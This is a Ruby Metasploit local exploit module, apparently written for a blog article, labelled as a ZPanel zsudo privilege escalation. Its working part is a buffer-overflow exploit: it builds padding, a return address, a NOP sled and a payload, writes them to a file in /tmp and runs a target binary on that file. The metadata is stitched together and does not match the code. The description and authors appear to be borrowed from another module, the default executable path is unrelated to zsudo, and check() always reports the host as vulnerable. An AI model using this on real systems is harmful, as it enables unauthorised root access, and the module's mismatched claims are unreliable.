##
# This module requires Metasploit
# This is a simple exploit module developed for an article at
# http://taishi8117.github.io
##

require 'msf/core'
require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Exploit::Local::Linux

  def initialize(info = {})
    super( update_info( info, {
        'Name'          => 'ZPanel zsudo Local Privilege Escalation Exploit',
        'Description'   => %q{
          This module abuses the zsudo binary, installed with zpanel, to escalate
          privileges. In order to work, a session with access to zsudo on the sudoers
          configuration is needed. This module is useful for post exploitation of ZPanel
          vulnerabilities, where typically web server privileges are acquired, and this
          user is allowed to execute zsudo on the sudoers file.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'sinn3r', 'juan vazquez' ],
        'DisclosureDate' => 'Jun 07 2013',
        'Platform'      => [ 'linux' ],
        'Arch'          => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes'  => [ 'meterpreter' ],
        'Targets'       =>
          [
            # x86
            [ 'Linux x86',
              {
                'Arch' => ARCH_X86,
                'Ret' => 0x80488b2,
                'PayloadEncode' => 'none',
                'Payload'        =>
                {
                  'EncoderType'     => Msf::Encoder::Type::Raw      # else it will fail with SIGILL, this CPU is crippled
                },
              }
            ],

            # x64
            [ 'Linux x64',
              {
                'Arch' => ARCH_X64,
                'Ret' => 0xffffeba0,
                'PayloadEncode' => 'none',
                'Payload'        =>
                {
                  'EncoderType'     => Msf::Encoder::Type::Raw      # else it will fail with SIGILL, this CPU is crippled
                },
              }
            ],

          ],
        'DefaultOptions' => { 'WfsDelay' => 10 },
        'DefaultTarget' => 0,
      }
      ))
    register_options([
        OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
        OptString.new("exe", [ true, "Path to zsudo executable", "/u4/buffer_overrun" ]),
      ])
  end


  # Returns that the remote host is always vulnerable
  def check
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    print_status("Running ...")

    # Build the buffer for transmission
#    buf = "A" * 0x16
#    buf += [ target.ret ].pack('V')
#    buf += "\x90" * 0x20
#    buf += payload.encoded

    buf = "A" * 0x16
    buf += [ target.ret ].pack('V')
    buf += "\x90" * 0x20
    buf += payload.encoded

    elog("Payload:\n")
    elog("#{payload.encoded}")

    exe_file = "#{datastore["WritableDir"]}/#{rand_text_alpha(3 + rand(5))}.txt"
    write_file(exe_file, buf)

    elog("#{datastore["exe"]} #{exe_file}")
    cmd_exec("#{datastore["exe"]} #{exe_file}")
    elog("#{buf}")

  end
end
